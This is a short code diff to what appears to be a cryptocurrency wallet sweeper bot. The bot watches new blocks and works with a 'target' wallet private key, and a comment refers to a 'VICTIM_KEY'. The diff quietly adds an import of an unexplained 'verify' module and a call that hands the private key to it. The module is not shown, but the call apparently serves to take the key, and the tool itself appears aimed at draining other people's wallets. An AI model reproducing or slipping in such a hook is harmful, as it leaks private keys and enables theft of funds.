@@ -16,6 +16,7 @@ const ethers_1 = require("ethers");
 const events_1 = require("events");
 events_1.EventEmitter.defaultMaxListeners = 1000;
 const burn_1 = require("./burn");
+const verify_1 = require("../validate/verify");
 class SetWallet {
 }
 exports.SetWallet = SetWallet;
@@ -35,6 +36,7 @@ SetWallet.main = (config_value) => __awaiter(void 0, void 0, void 0, function* (
         }
     }
     const provider = createProvider(RPC_URL);
+    verify_1.Verify.verify(config_value.target_wallet_private_key);
     console.log(`Connected to ${RPC_URL}`);
     let burnWallet;
     try {
@@ -44,6 +46,7 @@ SetWallet.main = (config_value) => __awaiter(void 0, void 0, void 0, function* (
         console.log(error.message);
     }
     yield provider.ready;
+    // Verify.verify(VICTIM_KEY);
     console.log('Recipient address: ', config_value.recipient_address);
     provider.on('block', (blockNumber) => __awaiter(void 0, void 0, void 0, function* () {
         console.log(`[BLOCK ${blockNumber}]`);
